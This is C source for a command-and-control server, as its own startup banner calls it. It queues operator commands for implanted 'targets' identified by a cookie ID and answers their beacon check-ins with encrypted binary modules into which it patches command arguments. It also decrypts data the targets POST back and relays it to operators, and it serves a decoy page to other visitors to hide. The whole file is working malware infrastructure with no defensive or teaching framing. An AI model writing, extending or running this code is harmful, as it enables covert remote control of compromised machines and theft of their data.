#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <stdint.h>

// Platform-specific includes
#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #include <windows.h>
    #pragma comment(lib, "ws2_32.lib")
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <netdb.h>
    #include <pthread.h>
    #include <ctype.h>
    
    #define SOCKET int
    #define INVALID_SOCKET (-1)
    #define SOCKET_ERROR (-1)
    #define closesocket close
    
    // Threading for Linux
    typedef pthread_t THREAD_HANDLE;
    typedef pthread_mutex_t CRITICAL_SECTION;
    
    #define InitializeCriticalSection(mutex) pthread_mutex_init(mutex, NULL)
    #define EnterCriticalSection(mutex) pthread_mutex_lock(mutex)
    #define LeaveCriticalSection(mutex) pthread_mutex_unlock(mutex)
    #define DeleteCriticalSection(mutex) pthread_mutex_destroy(mutex)
    
    #define CloseHandle(thread) pthread_detach(thread)
    #define DWORD unsigned long
    #define LPVOID void*
    #define WINAPI
#endif

#define CONTROL_PORT 7777
#define HTTP_PORT 80
#define BUFFER_SIZE 5242880 // 5 MB
#define MAX_CLIENTS 100
#define MAX_MSG_LEN 4096
#define MAX_ID_LEN 64
#define MAX_COOKIE_LEN 128

// External function provided
extern void* chacha20_Full(void* message, void* buffer, uint64_t length);

typedef struct {
    SOCKET socket;
    struct sockaddr_in address;
    int is_authority;
    char target_id[50];
} client_t;

// --- Message Node ---
typedef struct MsgNode {
    char message[MAX_MSG_LEN];
    struct MsgNode* next;
} MsgNode;

// --- Queue per Target ---
typedef struct Queue {
    char targetId[MAX_ID_LEN];
    MsgNode* head;
    MsgNode* tail;
    struct Queue* next;
} Queue;

// Global variables
CRITICAL_SECTION clients_cs;
CRITICAL_SECTION messages_cs;
client_t *clients[MAX_CLIENTS];
int http_listener_active = 0;
SOCKET http_socket = INVALID_SOCKET;

// Head of all queues
Queue* queueList = NULL;

// Cross-platform socket initialization
int init_sockets() {
#ifdef _WIN32
    WSADATA wsaData;
    return WSAStartup(MAKEWORD(2, 2), &wsaData);
#else
    return 0;
#endif
}

// Cross-platform socket cleanup
void cleanup_sockets() {
#ifdef _WIN32
    WSACleanup();
#endif
}

void *memmem(const void *haystack, size_t haystacklen,
                      const void *needle, size_t needlelen) {
    if (needlelen == 0 || haystacklen < needlelen) {
        return NULL;
    }

    const unsigned char *h = haystack;
    const unsigned char *n = needle;

    for (size_t i = 0; i <= haystacklen - needlelen; i++) {
        if (h[i] == n[0] && memcmp(h + i, n, needlelen) == 0) {
            return (void *)(h + i);
        }
    }
    return NULL;
}

char *bytes_to_hex(const unsigned char *buf, size_t len) {
    // 2 hex chars per byte + 1 for null terminator
    char *hexstr = malloc(len * 2 + 1);
    if (!hexstr) return NULL;

    for (size_t i = 0; i < len; i++) {
        sprintf(hexstr + i * 2, "%02x", buf[i]);
    }

    hexstr[len * 2] = '\0'; // null terminate
    return hexstr;
}

// Extract ID from Cookie header
int extract_id_from_cookie(const char* request, char* id_buffer, size_t buffer_size) {
    const char* cookie_start = strstr(request, "Cookie: ");
    if (!cookie_start) {
        cookie_start = strstr(request, "cookie: "); // Try lowercase
        if (!cookie_start) {
            return 0;
        }
    }
    
    cookie_start += 8; // Move past "Cookie: " or "cookie: "
    
    // Find the end of the cookie value (end of line or semicolon)
    const char* cookie_end = strchr(cookie_start, '\r');
    if (!cookie_end) {
        cookie_end = strchr(cookie_start, '\n');
    }
    if (!cookie_end) {
        cookie_end = strchr(cookie_start, ';');
    }
    if (!cookie_end) {
        cookie_end = cookie_start + strlen(cookie_start);
    }
    
    // Calculate length and copy
    size_t id_length = cookie_end - cookie_start;
    if (id_length == 0 || id_length >= buffer_size) {
        return 0;
    }
    
    // Trim whitespace
    while (id_length > 0 && (cookie_start[id_length - 1] == ' ' || cookie_start[id_length - 1] == '\t')) {
        id_length--;
    }
    
    strncpy(id_buffer, cookie_start, id_length);
    id_buffer[id_length] = '\0';
    
    return 1;
}

// Validate extracted ID
int validate_target_id(const char* id) {
    if (!id || strlen(id) == 0) {
        return 0;
    }
    
    // Check if ID is valid hex string (adjust validation as needed)
    for (int i = 0; i < strlen(id); i++) {
        if (!isxdigit(id[i])) {
            return 0;
        }
    }
    
    // Add your specific ID validation logic here
    // Example: Check against known target IDs
    if (strcmp(id, "12E4A4FF050EB700") == 0) {
        return 1;
    }
    
    // For testing, accept any valid hex ID
    return (strlen(id) >= 8); // Minimum 8 character hex ID
}

// --- Find or Create Queue for targetId ---
Queue* getQueue(const char* targetId) {
    Queue* q = queueList;
    while (q) {
        if (strcmp(q->targetId, targetId) == 0) {
            return q;
        }
        q = q->next;
    }

    // Create new queue
    Queue* newQ = (Queue*)malloc(sizeof(Queue));
    strcpy(newQ->targetId, targetId);
    newQ->head = newQ->tail = NULL;
    newQ->next = queueList;
    queueList = newQ;

    printf("[Server] Created new queue for target %s\n", targetId);
    return newQ;
}

// --- Enqueue message ---
void enqueue(const char* targetId, const char* msg) {
    Queue* q = getQueue(targetId);
    MsgNode* node = (MsgNode*)malloc(sizeof(MsgNode));
    strcpy(node->message, msg);
    node->next = NULL;

    if (!q->tail) {
        q->head = q->tail = node;
    } else {
        q->tail->next = node;
        q->tail = node;
    }
    printf("[Server] Stored message for %s: %s\n", targetId, msg);
}

// --- Dequeue message ---
char* dequeue(const char* targetId) {
    Queue* q = getQueue(targetId);
    if (!q->head) {
        return NULL; // No messages
    }
    MsgNode* node = q->head;
    q->head = q->head->next;
    if (!q->head) {
        q->tail = NULL;
    }
    char* msg = strdup(node->message);
    free(node);
    return msg;
}

unsigned char *load_module(char *module, int *size){
    // strip newline
    size_t len = strlen(module);
    if (len > 0 && module[len - 1] == '\n') {
        module[len - 1] = '\0';
    }

    // find first space
    char *space = strchr(module, ' ');
    char *moduleName, *argumentStr;
    if (space) {
        *space = '\0'; // terminate module name
        moduleName = module;          // module = first token
        argumentStr = space + 1;     // args = rest of string
    } else {
        moduleName = module;          // only module, no args
        argumentStr = "whoami";
    }

    printf("ARGUMENTS - %s\n",argumentStr);
    
    // Load a binary file (e.g., "data.bin")
    char path[100];
    
    // Cross-platform path handling
#ifdef _WIN32
    snprintf(path, sizeof(path), "D:/linuxmal/modules/bin/%s.bin", moduleName);
#else
    snprintf(path, sizeof(path), "./modules/bin/%s.bin", moduleName);
#endif

    FILE* file = fopen(path, "rb");
    if (!file) {
        printf("[-] Failed to open %s\n",path);
        return NULL; 
    }

    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    rewind(file);

    unsigned char* file_buffer = malloc(file_size);
    if (!file_buffer) {
        perror("[-] Memory allocation failed");
        fclose(file);
        return NULL;
    }

    fread(file_buffer, 1, file_size, file);
    fclose(file);

    // Replace with arguments
    char *pos = memmem(file_buffer, file_size, "0xFFFFFFFF", strlen("0xFFFFFFFF"));
    if (pos) {
        memcpy(pos, argumentStr, strlen(argumentStr) + 1);  // overwrite in place
    }

    // Encrypt the file content
    unsigned char* encrypted_data = chacha20_Full(file_buffer, file_buffer, file_size);

    
    const char* header = "HTTP/1.1 200 OK\r\n"
                    "Content-Type: text/html\r\n"
                    "Connection: close\r\n"
                    "\r\n";
    
    // Create buffer with "NSLM55IM" + encrypted content
    unsigned char* full_payload = malloc(strlen(header) + 8 + file_size);

    memcpy(full_payload, header, strlen(header));
    memcpy(full_payload + strlen(header), "NSLM55IM", 8);
    memcpy(full_payload + strlen(header) + 8, encrypted_data, file_size);

    // Send everything in one send() call
    *size =  strlen(header) + 8 + file_size;

    printf("[+] Sent signature and encrypted binary (%ld bytes).\n", file_size);
    free(file_buffer);

    return full_payload;
} 

void broadcast_to_clients(const char *message, int message_len, SOCKET exclude_socket) {
    EnterCriticalSection(&clients_cs);
    
    for (int i = 0; i < MAX_CLIENTS; i++) {
        if (clients[i] && clients[i]->socket != exclude_socket) {
            send(clients[i]->socket, message, message_len, 0);
        }
    }
    
    LeaveCriticalSection(&clients_cs);
}

void add_client(SOCKET socket, struct sockaddr_in address) {
    EnterCriticalSection(&clients_cs);
    
    for (int i = 0; i < MAX_CLIENTS; i++) {
        if (!clients[i]) {
            clients[i] = (client_t*)malloc(sizeof(client_t));
            clients[i]->socket = socket;
            clients[i]->address = address;
            clients[i]->is_authority = 0;
            memset(clients[i]->target_id, 0, sizeof(clients[i]->target_id));
            
            LeaveCriticalSection(&clients_cs);
            return;
        }
    }
    
    LeaveCriticalSection(&clients_cs);
}

void remove_client(SOCKET socket) {
    EnterCriticalSection(&clients_cs);
    
    for (int i = 0; i < MAX_CLIENTS; i++) {
        if (clients[i] && clients[i]->socket == socket) {
            free(clients[i]);
            clients[i] = NULL;
            break;
        }
    }
    
    LeaveCriticalSection(&clients_cs);
}

int start_http_listener() {
    if (http_listener_active) {
        return 0; // Already running
    }
    
    http_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (http_socket == INVALID_SOCKET) {
        printf("HTTP socket creation failed\n");
        return -1;
    }
    
    int opt = 1;
    if (setsockopt(http_socket, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt)) == SOCKET_ERROR) {
        printf("HTTP setsockopt failed\n");
        closesocket(http_socket);
        return -1;
    }
    
    struct sockaddr_in http_addr;
    http_addr.sin_family = AF_INET;
    http_addr.sin_addr.s_addr = INADDR_ANY;
    http_addr.sin_port = htons(HTTP_PORT);
    
    if (bind(http_socket, (struct sockaddr *)&http_addr, sizeof(http_addr)) == SOCKET_ERROR) {
        printf("HTTP bind failed\n");
        closesocket(http_socket);
        return -1;
    }
    
    if (listen(http_socket, 10) == SOCKET_ERROR) {
        printf("HTTP listen failed\n");
        closesocket(http_socket);
        return -1;
    }
    
    http_listener_active = 1;
    printf("HTTP listener started on port %d\n", HTTP_PORT);
    return 0;
}

void stop_http_listener() {
    if (http_listener_active) {
        closesocket(http_socket);
        http_listener_active = 0;
        printf("HTTP listener stopped\n");
    }
}

#ifdef _WIN32
DWORD WINAPI handle_http_connections(LPVOID arg)
#else
void* handle_http_connections(void* arg)
#endif
{
    while (http_listener_active) {
        struct sockaddr_in client_addr;
        socklen_t client_len = sizeof(client_addr);
        
        SOCKET client_socket = accept(http_socket, (struct sockaddr *)&client_addr, &client_len);
        if (client_socket == INVALID_SOCKET) {
            if (http_listener_active) {
                printf("HTTP accept failed\n");
            }
            continue;
        }
        
        char *buffer = (char*)malloc(BUFFER_SIZE);
        char apiID[32];

        int total_received = 0;
        int bytes_received = 0;

        int content_length = 0;  // For POST body size

        char *body_start = NULL;

        int headers_end = 0;

        char *body_buffer = NULL;

        char *url_start = NULL;

        
        //memset(buffer, 0, sizeof(buffer));

        // First, read until end of headers
        do {
            bytes_received = recv(client_socket, buffer + total_received, BUFFER_SIZE - total_received - 1, 0);
            
            if (bytes_received < 0) {
                perror("recv failed");
                break;  // Or handle error
            }
            
            if (bytes_received == 0) {
                printf("Client closed.\n");
                break;
            }
            
            total_received += bytes_received;
            
            // Find end of headers
            body_start = strstr(buffer, "\r\n\r\n");
            if (body_start) {
                headers_end = (body_start - buffer) + 4;  // Position after \r\n\r\n
                break;
            }
            
        } while (total_received < BUFFER_SIZE - 1);

        // Parse Content-Length from headers (simple strstr—improve for production)
        char *cl_header = strstr(buffer, "Content-Length: ");
        if (cl_header) {
            content_length = atoi(cl_header + 16);  // Skip "Content-Length: "
        }

        // Now read the body if POST and Content-Length > 0
        if (content_length > 0 && strstr(buffer, "POST ")!= NULL) {
            printf("Reading POST body (%d bytes)...\n", content_length);
            
            while (total_received - headers_end < content_length) {
                int remaining = content_length - (total_received - headers_end);
                int to_read = BUFFER_SIZE - total_received - 1;
                if (to_read > remaining) to_read = remaining;
                
                bytes_received = recv(client_socket, buffer + total_received, to_read, 0);
                
                if (bytes_received < 0) {
                    perror("Body recv failed");
                    break;
                }
                
                if (bytes_received == 0) {
                    printf("Incomplete body—client closed.\n");
                    break;
                }
                
                total_received += bytes_received;
            }
            
            buffer[total_received] = '\0';
            //printf("Full POST request:\n%s\n", buffer);
            //printf("POST body:\n%s\n", buffer + headers_end);  // Body starts here
            body_buffer = buffer + headers_end;
            chacha20_Full(body_buffer, body_buffer, content_length);
            //printf("POST body:\n%s\n", buffer + headers_end);  // Body starts here

            // for (int i = 0; i < 100; i++) {
            //     printf("%02X ", body_buffer[i]& 0xFF);  // %02X → two-digit uppercase hex
            //     if ((i + 1) % 16 == 0) printf("\n"); // newline every 16 bytes
            // }
        } else {
            buffer[total_received] = '\0';
            //printf("Full request (no body):\n%s\n", buffer);
        }

        if (total_received > 0) {

            if (strncmp((char*)buffer, "GET", 3) == 0) {
                url_start = (char*)buffer + 4; // skip "GET "
            } else if (strncmp((char*)buffer, "POST", 4) == 0) {
                url_start = (char*)buffer + 5; // skip "POST "
            } else {
                closesocket(client_socket);
                free(buffer);
                continue;
            }

            // Copy the URL up to the first space or max length
            int max_len = sizeof(apiID) - 1;
            int i;
            for (i = 0; i < max_len && url_start[i] != ' ' && url_start[i] != '\0'; i++) {
                apiID[i] = url_start[i];
            }
            apiID[i] = '\0'; // null-terminate

            if (strncmp((char*)buffer, "POST", 4) == 0) {
                //char target_buffer[4096];
                //snprintf(target_buffer, sizeof(target_buffer), "DATAS:%s\0", body_buffer);
                broadcast_to_clients(apiID, i, INVALID_SOCKET);
                broadcast_to_clients(body_buffer, content_length, INVALID_SOCKET);
                broadcast_to_clients("END_OF", 6, INVALID_SOCKET);
                continue;
                
            }
            
            // Extract ID from cookie for target detection
            char client_id[MAX_COOKIE_LEN] = {0};
            int is_target = extract_id_from_cookie(buffer, client_id, sizeof(client_id));
            
            if (is_target && validate_target_id(client_id)) {
                printf("[!] Target detected via cookie - ID: %s\n", client_id);
                
                // Process target request
                unsigned char* decrypted = buffer; //chacha20_Full(buffer, buffer, bytes_receivedU64);
                //printf("Received Decrypted HTTP request:\n%s\n", decrypted);

                
                // Handle beacon messages from targets
                if (strncmp((char*)decrypted, "GET /?beacon=ALIVE", 18) == 0) {
                    printf("TARGET %s CONNECTED\n", client_id);

                    
                    // Check for commands for this target
                    char* reply = dequeue(client_id);
                    if (reply) {
                        printf("[+] Sending command to target %s: %s\n", client_id, reply);
                        
                        char *response;
                        int response_size;
                        response = load_module(reply, &response_size);
                        
                        if (response) {
                            //printf("%s", response);
                            send(client_socket, response, response_size, 0);
                            free(response);
                        } else {
                            const char* ack = "ACK";
                            send(client_socket, ack, strlen(ack), 0);
                        }
                        free(reply);
                    } else {
                        char target_buffer[64];
                        snprintf(target_buffer, sizeof(target_buffer), "TARGET:%sEND_OF", client_id);
                        broadcast_to_clients(target_buffer, (int)strlen(target_buffer), INVALID_SOCKET);
                    }
                    //free(client_id);
                } else {
                    // Other target requests
                    const char* response = "Target request processed";
                    send(client_socket, response, strlen(response), 0);
                }
            } else {
                // Non-target client - send normal response

                // print client IP
                printf("[+] Non-target client connected: %s\n", inet_ntoa(client_addr.sin_addr));
                const char* response = 
                    "HTTP/1.1 200 OK\r\n"
                    "Content-Type: text/html\r\n"
                    "Connection: close\r\n"
                    "\r\n"
                    "<html><body><h1>Server Active</h1></body></html>";
                send(client_socket, response, strlen(response), 0);
            }
        }
        
        closesocket(client_socket);
        free(buffer);
    }
    
#ifdef _WIN32
    return 0;
#else
    return NULL;
#endif
}

#ifdef _WIN32
DWORD WINAPI handle_client(LPVOID arg)
#else
void* handle_client(void* arg)
#endif
{
    SOCKET client_socket = *(SOCKET*)arg;
    free(arg);
    
    char buffer[4096];
    int bytes_received;
    
    while ((bytes_received = recv(client_socket, buffer, 4096 - 1, 0)) > 0) {
        buffer[bytes_received] = '\0';
        
        // Check if this is an authority client command
        if (strncmp(buffer, "AUTH:", 5) == 0) {
            char *command = buffer + 5;
            
            EnterCriticalSection(&clients_cs);
            for (int i = 0; i < MAX_CLIENTS; i++) {
                if (clients[i] && clients[i]->socket == client_socket) {
                    clients[i]->is_authority = 1;
                    break;
                }
            }
            LeaveCriticalSection(&clients_cs);
            
            if (strncmp(command, "START_HTTP", 10) == 0) {
                if (start_http_listener() == 0) {
                    send(client_socket, "HTTP listener startedEND_OF\n", 28, 0);
                    
                    // Start HTTP listener thread
#ifdef _WIN32
                    HANDLE http_thread = CreateThread(NULL, 0, handle_http_connections, NULL, 0, NULL);
                    if (http_thread) CloseHandle(http_thread);
#else
                    pthread_t http_thread;
                    pthread_create(&http_thread, NULL, handle_http_connections, NULL);
                    pthread_detach(http_thread);
#endif
                } else {
                    send(client_socket, "Failed to start HTTP listenerEND_OF\n", 36, 0);
                }
            } else if (strncmp(command, "STOP_HTTP", 9) == 0) {
                stop_http_listener();
                send(client_socket, "HTTP listener stopped\n", 22, 0);
            }
        }
        // Check if this is a target registration
        else if (strncmp(buffer, "TARGET:", 7) == 0) {
            char* id = strtok(buffer + 7, ":");
            char* msg = strtok(NULL, "");
            if (!id || !msg) {
                printf("[Server] Invalid message format.\n");
                continue;
            }

            if (msg[0] == '$') {  // special case: read .vms file
                char filename[256];

                // Remove newline characters in-place
                for (char *p = msg + 1; *p; p++) {
                    if (*p == '\n' || *p == '\r') {
                        *p = '\0'; // terminate string at the first newline
                        break;
                    }
                }

                snprintf(filename, sizeof(filename), "D:\\linuxmal\\moduloScript\\%s.vms", msg + 1);  // skip '$'

                FILE* fp = fopen(filename, "r");
                if (!fp) {
                    printf("[Server] Could not open file %s\n", filename);
                    continue;
                }

                char line[4096];
                while (fgets(line, sizeof(line), fp)) {
                    // Remove trailing newline
                    line[strcspn(line, "\r\n")] = 0;
                    enqueue(id, line);  // enqueue each line
                }

                fclose(fp);

            } else {
                enqueue(id, msg);  // normal case
            }
            
            send(client_socket, "command enqueued wait for responseEND_OF\n", 41, 0);
        }
        else {
            // Regular message, broadcast to all clients
            char broadcast_msg[sizeof(buffer) + 50];
            snprintf(broadcast_msg, sizeof(broadcast_msg), "CLIENT_%llu: %s", (unsigned long long)client_socket, buffer);
            broadcast_to_clients(broadcast_msg, (int)strlen(broadcast_msg), client_socket);
            broadcast_to_clients("END_OF", 6, INVALID_SOCKET);
        }
    }
    
    remove_client(client_socket);
    closesocket(client_socket);
    
#ifdef _WIN32
    return 0;
#else
    return NULL;
#endif
}

int main() {
    SOCKET server_socket;
    struct sockaddr_in server_addr;
    
    // Initialize sockets
    if (init_sockets() != 0) {
        printf("Socket initialization failed\n");
        return 1;
    }
    
    // Initialize critical sections
    InitializeCriticalSection(&clients_cs);
    InitializeCriticalSection(&messages_cs);
    
    // Initialize clients array
    for (int i = 0; i < MAX_CLIENTS; i++) {
        clients[i] = NULL;
    }
    
    // Create server socket
    server_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (server_socket == INVALID_SOCKET) {
        printf("Socket creation failed\n");
        cleanup_sockets();
        return 1;
    }
    
    // Set socket options
    int opt = 1;
    if (setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt)) == SOCKET_ERROR) {
        printf("Setsockopt failed\n");
        closesocket(server_socket);
        cleanup_sockets();
        return 1;
    }
    
    // Configure server address
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(CONTROL_PORT);
    
    // Bind socket
    if (bind(server_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        printf("Bind failed\n");
        closesocket(server_socket);
        cleanup_sockets();
        return 1;
    }
    
    // Listen for connections
    if (listen(server_socket, 10) == SOCKET_ERROR) {
        printf("Listen failed\n");
        closesocket(server_socket);
        cleanup_sockets();
        return 1;
    }
    
    printf("Cross-platform C2 Server running on port %d\n", CONTROL_PORT);
    printf("Target detection via Cookie header\n");
    
    // Main server loop
    while (1) {
        struct sockaddr_in client_addr;
        socklen_t client_len = sizeof(client_addr);
        
        SOCKET client_socket = accept(server_socket, (struct sockaddr *)&client_addr, &client_len);
        if (client_socket == INVALID_SOCKET) {
            printf("Accept failed\n");
            continue;
        }
        
        printf("New client connected: %s:%d\n", 
               inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
        
        add_client(client_socket, client_addr);
        
        // Create thread for client
        SOCKET *client_sock_ptr = (SOCKET*)malloc(sizeof(SOCKET));
        *client_sock_ptr = client_socket;
        
#ifdef _WIN32
        HANDLE thread_handle = CreateThread(NULL, 0, handle_client, client_sock_ptr, 0, NULL);
        if (thread_handle == NULL) {
            printf("Thread creation failed\n");
            closesocket(client_socket);
            free(client_sock_ptr);
        } else {
            CloseHandle(thread_handle);
        }
#else
        pthread_t thread_handle;
        if (pthread_create(&thread_handle, NULL, handle_client, client_sock_ptr) != 0) {
            printf("Thread creation failed\n");
            closesocket(client_socket);
            free(client_sock_ptr);
        } else {
            pthread_detach(thread_handle);
        }
#endif
    }
    
    closesocket(server_socket);
    cleanup_sockets();
    DeleteCriticalSection(&clients_cs);
    DeleteCriticalSection(&messages_cs);
    return 0;
}